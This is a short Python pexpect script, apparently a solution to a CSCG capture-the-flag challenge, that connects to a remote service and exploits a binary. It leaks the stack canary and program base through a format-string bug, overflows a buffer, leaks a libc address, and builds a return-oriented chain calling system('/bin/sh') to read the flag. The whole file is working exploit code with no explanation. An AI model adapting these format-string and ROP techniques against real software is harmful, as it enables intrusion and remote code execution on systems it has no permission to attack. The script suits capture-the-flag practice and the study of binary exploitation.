from pexpect import spawn
from struct import pack

p = spawn('/bin/bash', echo = False)
p.sendline('stty raw lnext ^- opost')
if 0:
    p.sendline('./pwn3;exit')
    p.sendline('CSCG{THIS_IS_TEST_FLAG}')
else:
    p.sendline('nc hax1.allesctf.net 9102;exit')
    p.sendline('CSCG{NOW_GET_VOLDEMORT}')

p.send('foo(%39$p,%41$p)\n')
p.expect("foo\((.*),(.*)\)")
canary = int(p.match[1].decode("utf8"), 16)
main = int(p.match[2].decode("utf8"), 16)
base = main & ~0xfff
print(f"canary = 0x{canary:x}")
print(f"main = 0x{main:x}")
print(f"base = 0x{base:x}")

payload1 = b'Expelliarmus' + b'\0' * 252 + pack('QQQ', canary, 0, base | 0xd74)
p.sendline(payload1)
p.sendline(b'zq(%7$s)' + pack('Q', base + 0x201f88))

p.expect("zq\((......)\)")
putsAddr = int.from_bytes(p.match[1], 'little')
libcBase = putsAddr - 0x87490
systemAddr = libcBase + 0x554e0
binsh = libcBase + 0x1b6613
print(f"libcBase = 0x{libcBase:x}")

realign = base | 0xcb7 # arbitrary RETN opcode
popRdi = base | 0xdf3

payload2 = b'Expelliarmus' + b'\0' * 252 + pack('QQQQQQ', canary, 0, realign, popRdi, binsh, systemAddr)
p.sendline(payload2)
p.sendline('cat flag;exit')
p.interact()
